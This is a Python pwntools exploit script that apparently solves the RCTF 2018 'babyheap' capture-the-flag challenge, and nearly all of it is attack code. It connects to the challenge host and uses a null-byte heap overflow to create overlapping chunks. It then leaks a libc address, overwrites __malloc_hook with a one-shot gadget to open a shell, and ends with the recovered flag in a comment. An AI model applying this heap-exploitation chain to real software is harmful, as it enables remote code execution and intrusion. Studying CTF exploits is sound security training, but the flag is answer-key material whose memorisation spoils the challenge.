from pwn import *

#s = process('./babyheap')
s = remote('babyheap.2018.teamrois.cn',3154)

def alloc(size,data):
	s.sendlineafter('e: ','1')
	s.sendlineafter('e: ',str(size))
	s.sendafter('t: ',data)

def show(idx):
	s.sendlineafter('e: ','2')
	s.sendlineafter('x: ',str(idx))

def free(idx):
	s.sendlineafter('e: ','3')
	s.sendlineafter('x: ',str(idx))

l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
alloc(0x30,'A' * 0x30)
alloc(0xf0,'A' * 0xf0)
alloc(0x70,'A' * 0x70)
alloc(0xf0,'A' * 0xf0)
alloc(0x30,'A' * 0x30)

free(1)
free(2)
alloc(0x78,'B' * 0x60 + p64(0) + p64(0x110) + p64(0x180))

# chunk overlap
free(3)
alloc(0xf0,'A' * 0xf0)

# libc leak
show(1)
s.recvuntil('content: ')
libc = u64(s.recv(6) + "\x00" * 2) - l.symbols['__malloc_hook'] - 0x68
log.info("libc : " + hex(libc))

free(2)
alloc(0x80, 'A' * 0x80)
alloc(0x80, 'C' * 0x60 + p64(0) + p64(0x71) + p64(0) + p64(0))

free(1)
free(3)
hook = libc + l.symbols['__malloc_hook'] - 0x23
oneshot = libc + 0x4526a
alloc(0x80, 'C' * 0x60 + p64(0) + p64(0x70) + p64(hook) + p64(0))

alloc(0x60,'A' * 0x60)
alloc(0x60,'A' * 0x13 + p64(oneshot) + "\n")

s.interactive()
# RCTF{Let_us_w4rm_up_with_a_e4sy_NU11_byte_overflow_lul_7adf58}
